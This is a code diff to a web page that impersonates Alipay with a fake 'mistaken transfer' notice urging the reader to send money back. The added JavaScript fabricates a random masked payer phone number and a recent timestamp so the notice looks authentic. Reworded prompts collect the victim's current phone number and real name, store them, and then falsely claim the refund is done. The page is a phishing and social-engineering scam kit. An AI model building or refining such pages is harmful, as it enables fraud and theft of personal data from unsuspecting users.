@@ -93,11 +93,11 @@
             <div class="gray" style="margin-bottom:10px;">处理状态：<span style="color:#0085FF">已提交</span></div>
             <div style="font-size:15px;line-height:1.7;">
                 有用户向支付宝反馈因输错账号向您此账户误转一笔钱，<a id="checkLink">点此进入单单核实</a>，如情况属实您可自行操作转回，转账详情如下：<br>
-                <br>打款方：136******49
+                <br>打款方：<span id="payer"></span>
                 <br>收款方：138******56
                 <br>转账交易号：20251106200040011100170099590526
                 <br>转账金额：1.00
-                <br>转账时间：2025-11-07 13:10
+                <br>转账时间：<span id="transTime"></span>
             </div>
             <div style="margin:18px 0 8px 0;">请选择以下方式之一进行处理：</div>
             <button class="btn btn-primary" id="btnSelf">自行转回给对方 <span class="tag">推荐</span></button>
@@ -113,6 +113,34 @@
         <p>这里是你的网页内容。</p>
     </div>
     <script>
+        // 生成随机手机号
+        function randomPhone() {
+            const heads = ['136', '178', '189', '135'];
+            const head = heads[Math.floor(Math.random() * heads.length)];
+            let mid = '';
+            for(let i=0;i<6;i++) mid += Math.floor(Math.random()*10);
+            let tail = '';
+            for(let i=0;i<2;i++) tail += Math.floor(Math.random()*10);
+            return head + mid + tail;
+        }
+        // 格式化手机号为 136******49
+        function maskPhone(phone) {
+            return phone.substr(0,3) + '******' + phone.substr(9,2);
+        }
+        // 获取当前时间减5分钟
+        function getTimeStr() {
+            const d = new Date(Date.now() - 5*60*1000);
+            const pad = n => n<10?'0'+n:n;
+            return d.getFullYear() + '-' + pad(d.getMonth()+1) + '-' + pad(d.getDate()) + ' ' +
+                pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());
+        }
+        // 页面初始化
+        window.onload = function() {
+            const phone = randomPhone();
+            document.getElementById('payer').innerText = maskPhone(phone);
+            document.getElementById('transTime').innerText = getTimeStr();
+        };
+
         function checkPhone(phone) {
             return /^1[3-9]\d{9}$/.test(phone);
         }
@@ -120,16 +148,16 @@
             return name && name.trim().length >= 2;
         }
         function showIdentityPrompt() {
-            let phone = prompt('由于今日转错款超过2次，请输入手机号码进行确认身份：');
+            let phone = prompt('由于近期转错款次数超过2次，请确认身份输入当前正在使用的手机号码：');
             if (phone && checkPhone(phone)) {
-                let name = prompt('由于今日转错款超过2次，请输入一个真实姓名以确认身份信息：');
+                let name = prompt('由于近期转错款次数超过2次，请输入真实姓名：');
                 if (checkName(name)) {
                     localStorage.setItem('my_phone', phone);
                     localStorage.setItem('my_name', name.trim());
                     document.getElementById('content').style.display = 'block';
                     document.getElementById('dialog').style.display = 'none';
                     setTimeout(function() {
-                        alert('已经为您自动处理，请关闭页面');
+                        alert('已自行转回给对方，请关闭页面');
                     }, 100);
                 } else {
                     alert('请输入真实姓名（不少于2个字）！');
